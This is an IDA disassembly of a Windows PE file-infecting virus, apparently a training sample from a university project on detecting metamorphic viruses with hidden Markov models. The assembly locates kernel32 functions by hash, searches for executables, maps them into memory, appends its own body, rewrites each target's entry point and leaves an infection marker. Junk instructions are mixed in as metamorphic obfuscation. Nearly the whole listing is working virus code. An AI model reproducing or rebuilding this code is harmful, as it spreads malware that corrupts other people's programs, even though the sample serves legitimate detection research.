

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; º Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TrainSet\N75.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00058000 ( 360448.)
; Section size in file		: 00057A00 ( 358912.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


		public start
start		proc near
		nop
		nop
		nop

		nop
		nop
		nop

loc_458058:				; DATA XREF: sub_4580CF+128r
		call	$+5

loc_45805D:				; DATA XREF: start+57066o
		pop	eax
		rcl	ecx, 9
		mov	ebp, eax
		shl	ebx, 4
		sub	ebp, offset loc_45805D
		jmp	loc_458598
start		endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_458071	proc near		; CODE XREF: sub_458684+67p
		pusha
		push	esi
		pop	edi
		push	esi
		pop	eax

loc_458076:				; CODE XREF: sub_458071+Bj
		add	eax, 1
		test	byte ptr [eax],	0
		jnz	short loc_458076
		sub	eax, edi
		push	eax
		pop	esi
		inc	esi
		cld
		sub	edx, edx
		sub	edx, 1
		mov	ebx, edx

loc_45808B:				; CODE XREF: sub_458071+48j
		sub	eax, eax
		and	ecx, 0
		mov	al, [edi]
		add	edi, 1
		xor	al, dl
		mov	dl, dh
		mov	dh, bl
		mov	bl, bh
		mov	bh, 8

loc_45809F:				; CODE XREF: sub_458071+41j
		shr	cx, 1
		rcr	ax, 1
		jnb	short loc_4580B0
		xor	ax, 8320h
		xor	cx, 0EDB8h

loc_4580B0:				; CODE XREF: sub_458071+34j
		dec	bh
		jnz	short loc_45809F
		xor	edx, eax
		xor	ebx, ecx
		dec	esi
		jnz	short loc_45808B
		not	ebx
		not	edx
		mov	eax, ebx
		rol	eax, 10h
		mov	ax, dx
		mov	ss:dword_4583A2[ebp], eax
		popa
		retn
sub_458071	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4580CF	proc near		; CODE XREF: sub_4585DC+99p
		mov	eax, ss:dword_458396[ebp]
		mov	ecx, eax
		add	ecx, [eax+3Ch]
		mov	edx, [ecx+3Ch]
		mov	ebx, ss:dword_45842B[ebp]
		mov	ss:dword_458551[ebp], edx
		add	ebx, 7D3h
		mov	ss:dword_4583B2[ebp], ebx
		or	ecx, 498FABEh
		call	loc_4587AF
		mov	ebx, ss:dword_4583B2[ebp]
		mov	ss:dword_458589[ebp], ebx
		pusha
		call	sub_4582FE
		popa
		xor	eax, ebx
		mov	ss:dword_45842B[ebp], ebx
		call	sub_45829D
		jb	loc_458217
		mov	esi, ss:dword_458396[ebp]
		mov	eax, esi
		add	eax, [esi+3Ch]
		push	eax
		pop	esi
		movzx	ecx, word ptr [esi+6]
		sub	ecx, 1
		imul	ecx, 28h
		neg	edx
		inc	eax
		add	eax, 77h
		add	eax, ecx
		mov	ebx, [esi+74h]
		shl	ebx, 3
		add	eax, ebx
		mov	ecx, [esi+28h]
		mov	ss:dword_4583A6[ebp], ecx
		mov	ebx, [esi+34h]
		mov	ss:dword_458585[ebp], ebx
		sbb	ecx, 1Ch
		sub	ecx, ecx
		add	ecx, [eax+10h]
		mov	edx, 4078h
		sub	edx, 4078h
		add	edx, ecx
		add	ecx, [eax+14h]
		push	ecx
		push	edx
		pop	ebx
		add	ebx, [eax+0Ch]
		mov	ss:dword_458392[ebp], ebx
		mov	[esi+28h], ebx
		sub	ss:dword_4583AE[ebp], 1397453h
		mov	ebx, [eax+10h]
		push	ebx
		add	ebx, 7D3h
		mov	ss:dword_4583B2[ebp], ebx
		push	dword ptr [esi+3Ch]
		pop	ss:dword_458551[ebp]
		call	loc_4587AF
		xor	ebx, ebx
		add	ebx, ss:dword_4583B2[ebp]
		mov	[eax+10h], ebx
		xor	ss:dword_4583AE[ebp], 1963375h
		pop	ebx
		add	ebx, 7D3h
		mov	dword ptr [eax+8], 0
		add	[eax+8], ebx
		mov	ebx, [eax+0Ch]
		add	ebx, [eax+10h]
		mov	[esi+50h], ebx
		or	dword ptr [eax+24h], 0A0000020h
		mov	dword ptr [esi+4Ch], 4E3735h
		pop	edi
		add	edi, ss:dword_458396[ebp]
		mov	ebx, 7D3h
		lea	esi, loc_458058[ebp]

loc_4581FD:				; CODE XREF: sub_4580CF+130j
		movsb
		dec	ebx
		jnz	short loc_4581FD
		mov	ecx, 0
		add	ecx, ss:dword_4583BE[ebp]
		add	ecx, 0FFFFFFFFh
		mov	ss:dword_4583BE[ebp], ecx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_458217:				; CODE XREF: sub_4580CF+51j
		stc
		retn
sub_4580CF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_458219	proc near		; CODE XREF: sub_458231+3p sub_458250p
		pusha
		lea	edx, dword_458437[ebp]
		mov	eax, 11Dh
		xor	eax, 9

loc_458228:				; CODE XREF: sub_458219+14j
		mov	byte ptr [edx],	0
		inc	edx
		dec	eax
		jnz	short loc_458228
		popa
		retn
sub_458219	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_458231	proc near		; CODE XREF: CODE:00458359p
		sbb	ecx, 0Bh
		call	sub_458219
		mov	ecx, ebp
		add	ecx, offset dword_45840B
		push	ecx
		push	esi
		call	ss:dword_458569[ebp]
		mov	ss:dword_4583BA[ebp], eax
		retn
sub_458231	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_458250	proc near		; CODE XREF: CODE:00458374p
		call	sub_458219
		mov	eax, ebp
		inc	ebx
		add	eax, offset dword_45840B
		push	eax
		mov	eax, ss:dword_4583BA[ebp]
		push	eax
		call	ss:dword_458575[ebp]
		retn
sub_458250	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_45826C	proc near		; CODE XREF: sub_4585DC+15p
		push	0
		push	0
		push	3
		push	0
		push	1
		mov	eax, 0C0000000h
		push	eax
		lea	ebx, dword_458437[ebp]
		push	ebx
		call	ss:dword_458561[ebp]
		and	ecx, ebx
		inc	eax
		jz	short loc_4582FC
		sub	eax, 1
		add	edx, 5DBE84h
		mov	ss:dword_458555[ebp], eax
sub_45826C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_45829D	proc near		; CODE XREF: sub_4580CF+4Cp
		push	ss:dword_45842B[ebp]
		pop	edx
		push	edx
		push	0
		push	edx
		push	0
		push	4
		push	0
		push	ss:dword_458555[ebp]
		call	ss:dword_458565[ebp]
		mov	ebx, eax
		mov	ss:dword_458581[ebp], ebx
		pop	edx
		or	eax, eax
		jz	short loc_4582F0
		push	edx
		push	0
		push	0
		mov	ecx, 2
		push	ecx
		push	ss:dword_458581[ebp]
		call	ss:dword_458579[ebp]
		test	eax, eax
		jz	short loc_4582EB
		push	eax
		pop	ss:dword_458396[ebp]
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4582EB:				; CODE XREF: sub_45829D+43j
					; sub_4585DC+A2p
		call	sub_4582FE

loc_4582F0:				; CODE XREF: sub_45829D+28j
		push	ss:dword_458555[ebp]
		call	ss:dword_45855D[ebp]

loc_4582FC:				; CODE XREF: sub_45826C+20j
		stc
		retn
sub_45829D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4582FE	proc near		; CODE XREF: sub_4580CF+3Ep
					; sub_45829D+4Ep
		push	ss:dword_458396[ebp]
		call	ss:dword_45856D[ebp]
		mov	ss:dword_4583AE[ebp], ecx
		push	ss:dword_458581[ebp]
		call	ss:dword_45855D[ebp]
		retn
sub_4582FE	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		shl	ebx, 16h

loc_458320:				; DATA XREF: CODE:00458823r
		mov	ebx, ss:dword_458585[ebp]
		mov	dword ptr ss:(loc_45879F+2)[ebp], ebx
		mov	ss:dword_458559[ebp], ebx
		mov	esi, ss:dword_4583A6[ebp]
		mov	dword ptr ss:(loc_45879A+1)[ebp], esi
		mov	ebx, ss:dword_458585[ebp]
		mov	dword ptr ss:(loc_45879F+2)[ebp], ebx
		push	14h
		pop	ss:dword_4583BE[ebp]
		mov	esi, offset loc_45858D
		add	esi, ebp
		call	sub_458231
		inc	eax
		jz	short loc_45837E
		shl	edx, 12h

loc_458364:				; CODE XREF: CODE:0045837Cj
		call	sub_4585DC
		mov	ecx, ss:dword_4583BE[ebp]
		cmp	ecx, 0
		jz	short loc_45837E
		call	sub_458250
		cmp	eax, 0
		jnz	short loc_458364

loc_45837E:				; CODE XREF: CODE:0045835Fj
					; CODE:00458372j
		push	ss:dword_4583BA[ebp]
		call	ss:dword_458571[ebp]
		jmp	loc_458796
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		db 0C1h, 0FAh, 2
dword_458392	dd 0			; DATA XREF: sub_4580CF+AEw
dword_458396	dd 0			; DATA XREF: sub_4580CFr
					; sub_4580CF+57r ...
dword_45839A	dd 0			; DATA XREF: sub_458684+60w
					; sub_458684+83r
dword_45839E	dd 0			; DATA XREF: CODE:004585D1w
					; sub_458684+3r
dword_4583A2	dd 0			; DATA XREF: sub_458071+56w
					; sub_458684+77r
dword_4583A6	dd 0			; DATA XREF: sub_4580CF+81w
					; CODE:00458332r ...
dword_4583AA	dd 0			; DATA XREF: sub_458684+43w
					; sub_458684+AFr
dword_4583AE	dd 0			; DATA XREF: sub_4580CF+B7w
					; sub_4580CF+EAw ...
dword_4583B2	dd 0			; DATA XREF: sub_4580CF+20w
					; sub_4580CF+31r ...
dword_4583B6	dd 0			; DATA XREF: sub_458684+DFw
					; CODE:0045880Br
dword_4583BA	dd 0			; DATA XREF: sub_458231+18w
					; sub_458250+Er ...
dword_4583BE	dd 0			; DATA XREF: sub_4580CF+137r
					; sub_4580CF+140w ...
word_4583C2	dw 0			; DATA XREF: sub_458684+8Fw
					; sub_458684+96r ...
dword_4583C4	dd 68624A9Dh, 8C892DDFh, 96B2D96Ch, 0AE17EBEFh,	94524B42h
					; DATA XREF: CODE:004587E6o
		dd 0C200BE21h, 0AA700106h, 797B49ECh, 336E6957h, 374E2E32h
		dd 72632035h, 65746165h, 79622064h, 616E5320h, 7942656Bh
		db 74h,	65h, 0
dword_458403	dd 0			; DATA XREF: sub_458684+24w
					; sub_458684+C7r
dword_458407	dd 0			; DATA XREF: sub_458684+35w
					; sub_458684+4Cr
dword_45840B	dd 8 dup(0)		; DATA XREF: sub_458231+Ao
					; sub_458250+8o
dword_45842B	dd 0			; DATA XREF: sub_4580CF+Er
					; sub_4580CF+46w ...
		dd 2 dup(0)
dword_458437	dd 0			; DATA XREF: sub_458219+1r
					; sub_45826C+10r
		dd 45h dup(0)
		db 2 dup(0)
dword_458551	dd 0			; DATA XREF: sub_4580CF+14w
					; sub_4580CF+D4w ...
dword_458555	dd 0			; DATA XREF: sub_45826C+2Bw
					; sub_45829D+11r ...
dword_458559	dd 0			; DATA XREF: CODE:0045832Cw
dword_45855D	dd 0			; DATA XREF: sub_45829D+59r
					; sub_4582FE+18r ...
dword_458561	dd 0			; DATA XREF: sub_45826C+17r
dword_458565	dd 0			; DATA XREF: sub_45829D+17r
dword_458569	dd 0			; DATA XREF: sub_458231+12r
dword_45856D	dd 0			; DATA XREF: sub_4582FE+6r
dword_458571	dd 0			; DATA XREF: CODE:00458384r
dword_458575	dd 0			; DATA XREF: sub_458250+15r
dword_458579	dd 0			; DATA XREF: sub_45829D+3Br
dword_45857D	dd 0			; DATA XREF: CODE:004585C6w
					; sub_458684+Cr ...
dword_458581	dd 0			; DATA XREF: sub_45829D+1Fw
					; sub_45829D+35r ...
dword_458585	dd 0			; DATA XREF: sub_4580CF+8Aw
					; CODE:00458320r ...
dword_458589	dd 0			; DATA XREF: sub_4580CF+37w
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_45858D:				; DATA XREF: CODE:00458352o
		sub	ch, [esi]
		db	65h
		pop	eax
		inc	ebp
		add	[ebx+0FEEFA6h],	bh

loc_458598:				; CODE XREF: start+5706Cj
		mov	ecx, [esp]
		shr	ecx, 10h
		ror	ecx, 10h

loc_4585A1:				; CODE XREF: CODE:004585BCj
					; CODE:004585C2j
		mov	edx, 0FFFFED75h
		add	edx, 128Bh
		mov	eax, 1
		sub	ecx, eax
		mov	dx, [ecx+3Ch]
		cmp	dx, 0F800h
		jz	short loc_4585A1
		cmp	ecx, [ecx+edx+34h]
		jnz	short loc_4585A1
		add	eax, eax
		mov	ss:dword_45857D[ebp], ecx
		mov	edx, [ecx+3Ch]
		add	edx, ecx
		mov	ss:dword_45839E[ebp], edx
		jmp	loc_4587E1

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4585DC	proc near		; CODE XREF: CODE:00458364p
		shl	eax, 3
		lea	ebx, dword_45842B[ebp]
		cmp	dword ptr [ebx], 88h
		jbe	locret_458683
		call	sub_45826C
		jb	locret_458683
		push	ss:dword_458396[ebp]
		pop	ecx
		cmp	word ptr [ecx],	5A4Dh
		jz	short loc_458618
		push	221Eh
		pop	ebx
		cmp	ebx, 221Eh
		jz	short loc_45867E

loc_458618:				; CODE XREF: sub_4585DC+2Cj
		cmp	word ptr [ecx+3Ch], 0
		jnz	short loc_458621
		jmp	short loc_45867E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_458621:				; CODE XREF: sub_4585DC+41j
		xor	ebx, ebx
		add	ebx, [ecx+3Ch]
		cmp	ss:dword_45842B[ebp], ebx
		jb	short loc_45867E
		add	ebx, ecx
		cmp	word ptr [ebx],	4550h
		jz	short loc_45864A
		sar	edx, 3
		mov	edx, 0A9F1h
		sub	edx, 19h
		cmp	edx, 0A9D8h
		jz	short loc_45867E

loc_45864A:				; CODE XREF: sub_4585DC+59j
		cmp	dword ptr [ebx+4Ch], 4E3735h
		jz	short loc_45867E
		mov	dx, [ebx+16h]
		and	dx, 2
		cmp	dx, 2
		jnz	short loc_45867E
		mov	ax, [ebx+16h]
		and	ax, 0F000h
		cmp	ax, 2000h
		jz	short loc_45867E
		add	edx, 4B07B69h
		call	sub_4580CF
		jnb	short loc_45867E
		jmp	short locret_458683
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_45867E:				; CODE XREF: sub_4585DC+3Aj
					; sub_4585DC+43j ...
		call	loc_4582EB

locret_458683:				; CODE XREF: sub_4585DC+Fj
					; sub_4585DC+1Aj ...
		retn
sub_4585DC	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_458684	proc near		; CODE XREF: CODE:004587FCp
		pusha
		adc	edx, edx
		mov	ebx, ss:dword_45839E[ebp]
		mov	esi, [ebx+78h]
		add	esi, ss:dword_45857D[ebp]
		dec	esi
		add	esi, 1Dh
		mov	ebx, [esi]
		add	ebx, ss:dword_45857D[ebp]
		and	edx, ebx
		dec	esi
		add	esi, 5
		mov	ss:dword_458403[ebp], ebx
		mov	ebx, [esi]
		add	ebx, ss:dword_45857D[ebp]
		add	esi, 4
		mov	ss:dword_458407[ebp], ebx
		mov	ebx, [esi]
		add	ebx, ss:dword_45857D[ebp]
		mov	ss:dword_4583AA[ebp], ebx
		and	edx, 0
		add	edx, ss:dword_458407[ebp]

loc_4586D6:				; CODE XREF: sub_458684+9Fj
		push	edx
		mov	ecx, [edx]
		add	ecx, ss:dword_45857D[ebp]
		push	ecx
		pop	edx
		mov	esi, edx
		push	esi
		mov	ss:dword_45839A[ebp], eax
		cld
		call	sub_458071
		mov	ecx, 1DCAh
		sub	ecx, 1DCAh
		add	ecx, ss:dword_4583A2[ebp]
		sub	ecx, [eax]
		test	ecx, ecx
		jz	short loc_458727
		mov	eax, ss:dword_45839A[ebp]
		pop	esi
		pop	edx
		inc	edx
		add	edx, 3
		inc	ss:word_4583C2[ebp]
		cmp	ss:word_4583C2[ebp], 2004h
		jnz	short loc_4586D6
		jmp	short loc_45877A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_458727:				; CODE XREF: sub_458684+81j
		pop	esi
		pop	esi
		movzx	edx, ss:word_4583C2[ebp]
		clc
		rcl	edx, 1
		add	edx, ss:dword_4583AA[ebp]
		push	edx
		pop	ebx
		movzx	edx, word ptr [ebx]
		shl	edx, 2
		and	ss:dword_4583AE[ebp], 1287816h
		add	edx, ss:dword_458403[ebp]
		adc	ss:dword_4583AE[ebp], offset loc_456744
		mov	ebx, ss:dword_45857D[ebp]
		add	ebx, [edx]
		mov	ss:dword_4583B6[ebp], ebx
		cmp	byte ptr [ebx],	0CCh
		jz	short loc_458796
		sub	ss:dword_4583AE[ebp], 907374h
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_45877A:				; CODE XREF: sub_458684+A1j
		pop	edi
		popa
		jmp	short loc_458796
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	eax, ss:dword_458585[ebp]
		mov	dword ptr ss:(loc_45879F+2)[ebp], eax
		mov	eax, ss:dword_4583A6[ebp]
		mov	dword ptr ss:(loc_45879A+1)[ebp], eax

loc_458796:				; CODE XREF: CODE:0045838Aj
					; sub_458684+E8j ...
		or	ebp, ebp
		jz	short loc_4587A7

loc_45879A:				; DATA XREF: CODE:00458338w
					; sub_458684+10Cw
		mov	ecx, 0

loc_45879F:				; DATA XREF: CODE:00458326w
					; CODE:00458344w ...
		add	ecx, 0
		push	ecx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4587A7:				; CODE XREF: sub_458684+114j
		xor	edx, edx
		push	edx		; uExitCode
		call	ExitProcess

loc_4587AF:				; CODE XREF: sub_4580CF+2Cp
					; sub_4580CF+DAp
		pusha
		mov	eax, ss:dword_4583B2[ebp]
		mov	ecx, ss:dword_458551[ebp]
		mov	edx, 0FFFF9ACFh
		add	edx, 6531h
		push	eax
		div	ecx
		sub	ecx, edx
		pop	eax
		add	eax, ecx
		mov	ss:dword_4583B2[ebp], 0
		add	ss:dword_4583B2[ebp], eax
		popa
		retn
sub_458684	endp ; sp = -20h

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4587E1:				; CODE XREF: CODE:004585D7j
		mov	edx, 8
		mov	eax, offset dword_4583C4
		add	eax, ebp
		lea	edi, dword_45855D[ebp]

loc_4587F3:				; CODE XREF: CODE:00458821j
		mov	ss:word_4583C2[ebp], 0
		call	sub_458684
		dec	eax
		sub	ecx, 479001h
		add	eax, 5
		push	ss:dword_4583B6[ebp]
		pop	ecx
		mov	dword ptr [edi], 0
		shl	ebx, 7
		add	[edi], ecx
		add	edi, 4
		dec	edx
		jnz	short loc_4587F3
		lea	ebx, loc_458320[ebp]
		push	ebx
		retn
; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		dd 73h dup(0)
		align 4
		dd 180h	dup(?)
CODE		ends

; Section 2. (virtual address 00059000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00058000
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 459000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 0005A000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00058000
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; void __stdcall __imp_ExitProcess(UINT	uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr



		end start
